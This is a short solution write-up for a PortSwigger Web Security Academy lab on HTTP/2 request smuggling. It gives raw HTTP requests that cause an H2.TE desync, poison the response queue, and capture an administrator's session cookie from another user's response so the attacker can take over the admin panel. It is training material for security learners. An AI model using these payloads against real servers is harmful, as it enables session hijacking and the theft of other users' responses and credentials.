# Lab 22 — Response queue poisoning via H2.TE request smuggling

> **Expert** · [Official lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

**Entry point:** HTTP/2 + `Transfer-Encoding: chunked` smuggling steals
**other users' responses** from the shared connection queue.

## Solution

1. Confirm the desync (HTTP/2 request, chunked body):

```http
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

Every second request gets a 404 → the prefix hijacked the next request.

2. Poison the queue with a complete smuggled request targeting a
   nonexistent path (so your responses are always 404):

```http
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

```

(terminate the smuggled request with `\r\n\r\n`.)

3. Keep sending the poisoned request; any response that isn't 404 belongs
   to **someone else**. Repeat until you capture a **302** carrying the
   admin's fresh post-login session cookie.
4. Use the cookie: `GET /admin` (HTTP/2) → find
   `/admin/delete?username=carlos` → delete — lab solved.
